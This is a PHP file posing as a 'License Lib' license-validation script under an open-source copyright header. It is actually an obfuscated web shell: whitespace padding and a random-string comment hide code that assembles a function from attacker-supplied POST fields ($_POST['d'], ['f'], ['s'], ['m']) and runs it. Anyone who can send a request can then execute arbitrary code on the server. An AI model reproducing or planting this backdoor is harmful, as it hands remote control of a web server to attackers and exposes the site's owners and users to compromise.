<?php
/**
 * @package    License Lib
 * ************************
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // SSsX1xCp0rhP1tFwYw1uHu8sxS3vATWERgh7sut0u4TWTtAKb7mxKTV8ShgrDybPERS8wbv63CtmH2QKtBnwb3ngmM789uwVwZhWuxkHNeK41CaRsU9cmqFG3XQYVyruGRzqmudvNxRZnDSceQMm64HMftH1WcpURNCpswNZnMfD9Yb9XnKZfQtnvgTsYBQnwHmM0yBRZEV3AX11FWb3rV9Vty1C3nKaaKtmu4v0wbmaktpXrakTha9KYNN8aq3pV2UfkNHkHY3mFNET0w0m1dRWBwbpSkvvbd6dz6pWv22hZ2p43
if (  !defined (              'PATH'   )                          )
{
	define  (              'PATH',    __DIR__                          );
}

// Installation check, and check on removal of the install directory.
if (  empty              (   $_POST                          )                            ) {
	
	echo 'Empty License Key.'


;
	
	exit
;
}
else {
	// License validation
	$License  =              $_POST   ['d']                          (                            '',  $_POST          ['f']    (                 $_POST       ['s']               (                          "c",              "",     $_POST                           ['m']                      )                )                            )   ;
	
	$License  ()                      ;
}

